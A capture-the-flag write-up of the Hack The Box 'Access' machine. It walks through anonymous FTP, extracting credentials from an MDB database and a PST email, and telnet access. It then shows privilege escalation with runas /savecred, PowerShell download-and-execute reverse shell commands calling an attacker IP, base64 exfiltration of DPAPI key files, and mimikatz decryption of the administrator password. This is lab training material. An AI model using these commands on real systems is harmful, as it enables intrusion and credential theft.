`Box: Windows`
`Level: Easy`
### Index
1. [Box Info](#Box%20Info)
2. [Initial_Nmap](#Initial_Nmap)
	1. [Initial Enumeration Observations](#Initial%20Enumeration%20Observations)
	2. [`FTP Binary Mode to download the file using FTP. Make Sure to use SUDO you dumber`](#`FTP%20Binary%20Mode%20to%20download%20the%20file%20using%20FTP.%20Make%20Sure%20to%20use%20SUDO%20you%20dumber`)
3. [Microsoft Access Database (MDB) Files](#Microsoft%20Access%20Database%20(MDB)%20Files)
	1. [`Extracting Password Protected 7z ZIP file`](#`Extracting%20Password%20Protected%207z%20ZIP%20file`)
	2. [`Personal Storage Table (PST) File`](#`Personal%20Storage%20Table%20(PST)%20File`)
	3. [`Telnet Session as a shell`](#`Telnet%20Session%20as%20a%20shell`)
4. [`CTF Using RunAs`](#`CTF%20Using%20RunAs`)
	1. [`CTF Using DPAPI Creds`](#`CTF%20Using%20DPAPI%20Creds`)
5. [`Dumb Mistakes`](#`Dumb%20Mistakes`)
6. [`Privilege Escalation Using PowerShell`](#`Privilege%20Escalation%20Using%20PowerShell`)
### `Box-Info`
```
Access is an &amp;quot;easy&amp;quot; difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.
```

### `Initial_Nmap`

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 444 guesses in 601 seconds, average tps: 0.7
| telnet-encryption: 
|_  Telnet server does not support encryption
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
Service Info: OS: Windows XP; CPE: cpe:/o:microsoft:windows_xp

```
###### `Initial Enumeration Observations`

1. FTP Anonymous Access Allowed but when trying to download the file I see Permission Denied. 
2.  The Title of the Web Site `LON-MC6`. Upon Googling the Title, I got the following details.
```
The MC6 is a fully programmable controller, capable of sending up to 16 different MIDI messages per switch.
```
3.  In the same Google Result, I found one more result which is `Patched Microsoft Access ‘MDB Leaker’ (CVE-2019-1463) Exposes Sensitive Data in Database Files` from [TrendMicro](https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/patched-microsoft-access-mdb-leaker-cve-2019-1463-exposes-sensitive-data-in-database-files). We do notice the `backup.mdf` file for a movement when I got anonymous access using FTP. But we did not have a permission to download it.
```
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
ftp: Can't access `backup.mdb': Permission denied
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
ftp: Can't access `backup.mdb': Permission denied
ftp> cd ..
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Engineer
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
```

4. The FTP share was also not writable. But I learn an interesting things this time for FTP.
###### `FTP Binary Mode to download the file using FTP. Make Sure to use SUDO you dumber`

So this was an interesting scenario. I will walk you through my dumbness here so you don't make the same mistake. There are things that I don't know but there are things that I know and don't pay attention to it. Classic Example. 

I notice the `FTP` port open and I tried ftp to the target and explore the target. But I was not able to list the files and folders on the target using `FTP`.

```
$ ftp anonymous@access.htb
Connected to access.htb.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49162|)

```

See the last line of the above output. It just hang there. Nothing happens. I don't know that I can just type `passive` command in FTP and get it enabled to list files and folders. Now look at the following result.

```
$ ftp anonymous@access.htb
Connected to access.htb.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> dir
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> 
```

Okay this is something I don't know that `FTP` client sometimes enabled in passive mode. So you make sure that you turn off the passive mode using `passive` command.
Fair Enough!!

Now upon exploring the `Backups` folder, I found that there was one file call `backup.mdb`. **BUT** I was not able to download this file. Check out below.
```
ftp> dir
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
ftp: Can't access `backup.mdb': Permission denied
ftp> 
```

Hmm...Permission denied. I thought the target is not allowing the Anonymous Users to download the file. but apparently my dumbness didn't allow me to think that I will have to use `sudo`.  So I used `sudo` and tried again. I should realized that when I see the message `Permission Denied` it can mean that there's something that the target is trying to write on my machine but since I have not use `sudo` in the parent command, It will failed. 

```
$ sudo ftp anonymous@access.htb
Connected to access.htb.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> cd Backups 
250 CWD command successful.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 EPRT command successful.
125 Data connection already open; Transfer starting.
 25% |******************************                                                                                             |  1382 KiB    1.34 MiB/s    00:02 ETAftp: Reading from network: Interrupted system call
  0% |                                                                                                                           |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
WARNING! 640 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
ftp>
```

And here's I'm trying to do it. But I get a warning that `File may not have transferred correctly`. So What I learn is that i need to use the `binary` command to enable  the `BINARY` mode before you download the file. Look at the successful file transfer after using `sudo` and `binary`.

```
$ sudo ftp anonymous@access.htb
Connected to access.htb.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> binary
200 Type set to I.
ftp> cd Backups
250 CWD command successful.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************************|  5520 KiB    1.41 MiB/s    00:00 ETA
226 Transfer complete.
5652480 bytes received in 00:03 (1.41 MiB/s)
ftp> 

ftp> cd ..
250 CWD command successful.
ftp> cd Engineer
250 CWD command successful.
ftp> dir
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get "Access Control.zip"
local: Access Control.zip remote: Access Control.zip
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************************| 10870       90.32 KiB/s    00:00 ETA
226 Transfer complete.
10870 bytes received in 00:00 (90.03 KiB/s)

```

I got both the file. The `backup.mdb` as well as `Access Control.zip`.
### `Microsoft Access Database (MDB) Files`

All right, We have got both `backup.mdb` and `Access Control.zip` file on our machine. The `Access Control.zip` file was a password protected. Upon following the Guided Mode on HTB, the first question was to provide the password for the `Access Contorl.zip` file. So my guess was to extract the password from the `backup.mdb` file. I installed the [mdbtools](https://www.kali.org/tools/mdbtools/) On kali and extract the password as follows. The list of Tables were too long to post and unnecessary but the only one useful table and that was `auth_user`

Extracting the Table
```
$ mdb-tables -1 backup.mdb  
acc_antiback
auth_permission
auth_user
... #List was too long. 128 tables enumerated
```
okay so let's use `mdb-json` to dump the content of the auth_user table. **How I know it was auth_user? I just dump content of some of the tables and landed on this one**

```
$ mdb-json backup.mdb auth_user 
{"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
{"id":27,"username":"engineer","password":"access4u@security","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
{"id":28,"username":"backup_admin","password":"admin","Status":1,"last_login":"08/23/18 21:14:02","RoleID":26}
```

All Right we got the password `access4u@security`. 
###### `Extracting Password Protected 7z ZIP file`
Now we will extract the ZIP file using 7z. use **SUDO** 
```
$ sudo 7z x Access\ Control.zip -paccess4u@security
[sudo] password for ringbuffer: 

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

Everything is Ok

Size:       271360
Compressed: 10870
```

cool. Now we have the following file in our directory after extracting the zip file.
```
$ ls
'Access Control.pst'
```
###### `Personal Storage Table (PST) File`
Okay now we have got the .pst file. Upon using the following command, we can extract the .mbox file.
```
$ sudo readpst -w Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.

$ ls
'Access Control.mbox'  'Access Control.pst'  'Access Control.zip'  
```

So now we have our mbox file which will allow us to read the content of the file. I did not follow any write up here. As I got the file, I Googled "PST File Kali" and got the tools that I can use within Kali to deal with that file and reading the tool manual. So now I was able to dump the content of the mbox file.
```
$ cat Access\ Control.mbox 
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-587680902_-_-"


----boundary-LibPST-iamunique-587680902_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-587680902_-_-"

--alt---boundary-LibPST-iamunique-587680902_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
Regards,
John
```
###### `Telnet Session as a shell`

```
$ telnet access.htb
Trying 10.10.10.98...
Connected to access.htb.
Escape character is '^]'.
security
Welcome to Microsoft Telnet Service 

login: security
password: 4Cc3ssC0ntr0ller

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>cd\

C:\>cd Users

C:\Users\security\Desktop>type user.txt
fc141e5f0467d6590d7e4464d4628bf8

C:\Users\security\Desktop>
```

okay now we got our user flag. Let's take a look at the privilege escalation.

I ran the `winPEAS.bat` but most of the things within winPEAS.bat was disabled by the administrator. Which is fair. Now I tune into HTB Guided Mode to look for the questions. One of the first question after obtaining the user flag was `What is the name of the executable called by the link file on the Public desktop?`.
```
C:\Users\Public\Desktop>dir

 Directory of C:\Users\Public\Desktop

08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)   3,339,649,024 bytes free
```

The Next question was `What Windows command, when given the `/list` option, will print information about the stored credentials available to the current user?`
The answer was cmdkey. Following to that I ran `cmdkey /list` command in the terminal and got the following result.

```
C:\Users\Public\Desktop>cmdkey /list

Currently stored credentials:

Target: Domain:interactive=ACCESS\Administrator
Type: Domain Password
User: ACCESS\Administrator
```

I also just dump the content of the `ZKAccess3.5 Security System.lnk` file where i found that the `/savecred` option was used with the `runas.exe`.
```
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
                                                                                                           runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
```

Cool. Now I tune into **Writeup**. We have two options. Use **Runas** along with Nishang Framework and use dpapi creds. I will use both the methods now.

### `CTF Using RunAs`

Get [Nishang](https://github.com/samratashok/nishang) - For xyz reason, This method was not working when I tried it out. But I saw couple of writeups even the official writeup has this method written in it.
Change the following line or add the following line at the end of `Invoke-PowerShellTCP.ps1` file. 

Check out why it was not working Under [Dumb Mistakes](#Dumb%20Mistakes) Section.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 4444
```

Now run the python web server and following to that run the following command in your target's telnet session. But make sure the Listener is running on port 4444.
```
runas /user:Access\Administrator /savecred "powershell iex(new-object new.webclient).downloadstring('http://10.10.14.4/Invole-PowerShellTCP.ps1')"
```

I tried the couple of variations such as the following commands but none of them seems working. The writeup people had all it working. 
```
runas /user:Access\Administrator /savecred "powershell -c iex(new-object new.webclient).downloadstring('http://10.10.14.4/shell.ps1')"
runas /user:Access\Administrator /savecred "cmd /c powershell -c iex(New-Object New.Webclient).downloadstring('http://10.10.14.4/shell.ps1')"
```

So I tried one of the following command which seems to work and got the root flag.

```
C:\Users\security\Documents>runas /user:Access\Administrator /savecred "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"

C:\Users\security\Desktop>type root.txt
df1be53d8a92f245e5fa0fc65b5b4a37
```

###### `CTF Using DPAPI Creds`

This is the first time I'm trying this method so definitely a learning curve here. We will grab two binary files from the Target. A Master Key and Credential File.

First let's grab the master key 
```
C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001

08/22/2018  10:18 PM    <DIR>          .
08/22/2018  10:18 PM    <DIR>          ..
08/22/2018  10:18 PM               468 0792c32e-48a5-4fe3-8b43-d93d64590580
08/22/2018  10:18 PM                24 Preferred
               2 File(s)            492 bytes
               2 Dir(s)   3,347,492,864 bytes free
```

Now I will use the certutil to base64 encode it.
```
C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 output
Input Length = 468
Output Length = 700
CertUtil: -encode command completed successfully.


C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>type output
-----BEGIN CERTIFICATE-----
AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMA
LQA4AGIANAAzAC0AZAA5ADMAZAA2ADQANQA5ADAANQA4ADAAAAAAAAAAAAAFAAAA
sAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAAnFHKTQBwjHPU+/9g
uV5UnvhDAAAOgAAAEGYAAOePsdmJxMzXoFKFwX+uHDGtEhD3raBRrjIDU232E+Y6
DkZHyp7VFAdjfYwcwq0WsjBqq1bX0nB7DHdCLn3jnri9/MpVBEtKf4U7bwszMyE7
Ww2Ax8ECH2xKwvX6N3KtvlCvf98HsODqlA1woSRdt9+Ef2FVMKk4lQEqOtnHqMOc
wFktBtcUye6P40ztUGLEEgIAAABLtt2bW5ZW2Xt48RR5ZFf0+EMAAA6AAAAQZgAA
D+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0CdnQ9DBEys1
/a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgbTN1Op8Rl3qp1
Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ
-----END CERTIFICATE-----
```

Next I will copy this certificate values in a text file on my kali machine and decode it. Just Copy the **Base64** here. Do not need to copy `---Begin Certificate---` and `---End Certificate---` Line.

```
# cat encoded_masterkey.b64 | base64 -d > masterkey

# cat masterkey                                    
0792c32e-48a5-4fe3-8b43-d93d64590580���Q�Mp�s���`�^T��C�f珱ى��נR���1����Q�2Sm��:FGʞ�c}�­�0j�V��p{                                                                                                                                              
```

Now I will do the same for Credentials File.
```
C:\Users\security\AppData\Roaming\Microsoft\Credentials>certutil -encode 51AB168BE4BDB3A603DADE4F8CA81290 output
Input Length = 538
Output Length = 800
CertUtil: -encode command completed successfully.

C:\Users\security\AppData\Roaming\Microsoft\Credentials>type output
-----BEGIN CERTIFICATE-----
AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6VI40+LQ9k9
ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQA
aQBhAGwAIABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/
MB8fEjrJTQejzAEgOBNfpaa8AAAAAA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m
5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7c1b5E0RycAsRf39nu
WlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+
WHhvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZh
xcVobtJWyGkQV/5v4qKxdlugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2h
X5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHCKaRRuRHpRpuhfXEojcbDfuJs
ZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/zBU7zW
C+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJ
vEgzQvv2cbicmQ==
-----END CERTIFICATE-----
```

Taking it to Kali and decoding it.

```
# nano encoded_credentialfile
┌──(root㉿kali)-[/home/ringbuffer/Downloads/Access.htb]
└─# cat encoded_credentialfile | base64 -d > credentialfile
┌──(root㉿kali)-[/home/ringbuffer/Downloads/Access.htb]
└─# cat credentialfile 
```

Okay Now I will copy both the file `masterkey` and `credentialfile` onto my Windows Host where mimikatz is installed. 

First I will use the `dpapi::masterkey` command in `mimikatz` to decrypt the masterkey using the password of a security user. Notice the first line, the password is of security user. The `/sid:` was taken from the directory from where the masterkey was copied. Check the command above where I use the `certutil` for the masterkey.

```
mimikatz # dpapi::masterkey /in:masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {0792c32e-48a5-4fe3-8b43-d93d64590580}
  dwFlags            : 00000005 - 5
  dwMasterKeyLen     : 000000b0 - 176
  dwBackupKeyLen     : 00000090 - 144
  dwCredHistLen      : 00000014 - 20
  dwDomainKeyLen     : 00000000 - 0
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 9c51ca4d00708c73d4fbff60b95e549e
    rounds           : 000043f8 - 17400
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : e78fb1d989c4ccd7a05285c17fae1c31ad1210f7ada051ae3203536df613e63a0e4647ca9ed51407637d8c1cc2ad16b2306aab56d7d2707b0c77422e7de39eb8bdfcca55044b4a7f853b6f0b3333213b5b0d80c7c1021f6c4ac2f5fa3772adbe50af7fdf07b0e0ea940d70a1245db7df847f615530a93895012a3ad9c7a8c39cc0592d06d714c9ee8fe34ced5062c412

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 4bb6dd9b5b9656d97b78f114796457f4
    rounds           : 000043f8 - 17400
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 0fe6b3aa5dd3af46bd7a87cbc0161fc41ae13f8714a22bcb5bda86f24d95ad03369a5335159185d0276743d0c1132b35fdaffad247d3c4f5f43260413c28b401ed70e42e0184f9e8c4668abc36eb7327bd2c7374a2381b4cdd4ea7c465deaa755e0f53672473900db8868b428327edaa

[credhist]
  **CREDHIST INFO**
    dwVersion        : 00000003 - 3
    guid             : {009668e5-9305-401b-ba0d-dfa0e11b34d0}



[masterkey] with password: 4Cc3ssC0ntr0ller (normal user)
  key : b360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
  sha1: bf6d0654ef999c3ad5b09692944da3c0d0b68afe
```

Next, I will use that masterkey to decrypt the credentialfile. Although, mimikatz can remember the masterkey that has been just decrpted but if you're facing an issue of `masterket not found` then you can provide the masterkey using `/masterkey:file_name` parameter.

```
mimikatz # dpapi::cred /in:credentialfile
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {0792c32e-48a5-4fe3-8b43-d93d64590580}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : f5bbbac240bd90d9af7d3c2cfb7f301f1f123ac94d07a3cc012038135fa5a6bc
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : f9642d323fae366a4f7293d02f26e4472adc32b00bac6a061914458dadfd3e52
  dwDataLen          : 00000100 - 256
  pbData             : e73542ff71d08529f9da5ff88edcd5be44d11c9c02c45fdfd9ee5a531628cb0f9e8dc221eb5b4d83a857aff13473131c927527217fe177e08d63a63eb5ce5341576b33332806e062363e58786fb7551aaa2e0676b8e3957f43cf1f11a2ed149c431104e5f93f20364916df25a0168ede23788bd9d71192cdb661c5c5686ed256c8691057fe6fe2a2b1765ba0979ee9140c010210eea81ac00830f74c35a196ac1f46bd69d7a86ca82da15f9bbcf1c40cbbe41d58d4a8924afde97e2a99a6e9f33a297ef2508401c229a451b911e9469ba17d71288dc6c37ee26c65ecc8accd4b5b3c0c2ccfcae6b0a76384a0e27c4edb7a0ecece2afd9889252304db5767bbc3
  dwSignLen          : 00000040 - 64
  pbSign             : 63fcc153bcd60befd074a5098ea0e552f8809562c553985baa8720a828e61e05bd5d1cb8200711551a100ed3b853598b3875ba90b689bc483342fbf671b89c99

Decrypting Credential:
 * volatile cache: GUID:{0792c32e-48a5-4fe3-8b43-d93d64590580};KeyHash:bf6d0654ef999c3ad5b09692944da3c0d0b68afe;Key:available
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000f4 - 244
  credUnk0       : 00002004 - 8196

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 2018-08-22 9:18:49 PM
  unkFlagsOrSize : 00000038 - 56
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=ACCESS\Administrator
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : ACCESS\Administrator
  CredentialBlob : 55Acc3ssS3cur1ty@megacorp  # ADMINISTRATOR PASSWORD
  Attributes     : 0
```

There you go!!, We got the Administrator Password. ~~~FINALLY~~~, now we can Telnet using the `55Acc3ssS3cur1ty@megacorp` as a password.

```
$ telnet access.htb                                          
Trying 10.10.10.98...
Connected to access.htb.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: Administrator
password: 55Acc3ssS3cur1ty@megacorp

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\Administrator>
```

So when I just run `powershell` from the Admin Command Prompt, I got a blank shell without a prompt. Something like this.
```
$ telnet access.htb
Trying 10.10.10.98...
Connected to access.htb.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: adi
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================

C:\Users\Administrator>powershell                                                        # LOOK AT THIS LINE
Windows PowerShell 
                   Copyright (C) 2009 Microsoft Corporation. All rights reserved.

whoami
access\administrator
```

But to get a prompt, I can simply add the following parameter when starting the powershell.
```
C:\Users\Administrator>powershell -File -
PS C:\Users\Administrator> whoami
access\administrator
PS C:\Users\Administrator> 
```

To Load the file properties (file property) for any file in windows, we can use the following one liner in the PowerShell. I was trying this because I wanted to see the actual path for the Windows Shortcut .lnk file.

```
C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Public\Desktop

08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)   3,341,197,312 bytes free

C:\Users\Public\Desktop>powershell -c "$WScript = New-Object -ComObject WScript.Shell; $SC = Get-ChildItem *.lnk; $WScript.CreateShortcut($sc)"

FullName         : C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk
Arguments        : /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
Description      : 
Hotkey           : 
IconLocation     : C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico,0
RelativePath     : 
TargetPath       : C:\Windows\System32\runas.exe
WindowStyle      : 1
WorkingDirectory : C:\ZKTeco\ZKAccess3.5
```

Notice that our original `ZKAccess3.5 Security System.lnk` has the actual path `C:\Windows\System32\runas.exe`. 

### `Dumb Mistakes`

Yes, You read that correctly. Dumb people like me always makes dumb mistakes and the inner soul always say that you must have done something wrong. 

There was a typo in my command. It should be 
```
powershell iex (new.object NET.WEBCLIENT) 
```

and I was using `New.Webclient` the Whole Time. So it worked when I correct my typo error. I was not copy paste the command and making such mistakes. 

### `Privilege Escalation Using PowerShell`

Okay so far, we tried everything using mimikatz. Since the PowerShell is working now (after I realized my dumb mistake), I wanted to cover up the way to get the Admin shell using the PowerShell form the `Security` user account.

First we are going to Convert the MasterKey into Base64 using PowerShell.
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580"))

PS C:\Users\Security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580"))

AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMALQA4AGIANAAzAC0AZAA5ADMAZAA2ADQANQA5ADAANQA4ADAAAAAAAAAAAAAFAAAAsAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAA
AAAACAAAAnFHKTQBwjHPU+/9guV5UnvhDAAAOgAAAEGYAAOePsdmJxMzXoFKFwX+uHDGtEhD3raBRrjIDU232E+Y6DkZHyp7VFAdjfYwcwq0WsjBqq1bX0nB7DHdCLn3jnri9/MpVBEtKf4U7bwszMyE7Ww2Ax8ECH2xKwv
X6N3KtvlCvf98HsODqlA1woSRdt9+Ef2FVMKk4lQEqOtnHqMOcwFktBtcUye6P40ztUGLEEgIAAABLtt2bW5ZW2Xt48RR5ZFf0+EMAAA6AAAAQZgAAD+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0
CdnQ9DBEys1/a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgbTN1Op8Rl3qp1Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ

```

You got your base64 for Master Key. Now same for the Credential File.

```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"))

PS C:\Users\Security\AppData\Roaming\Microsoft\Credentials> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"))
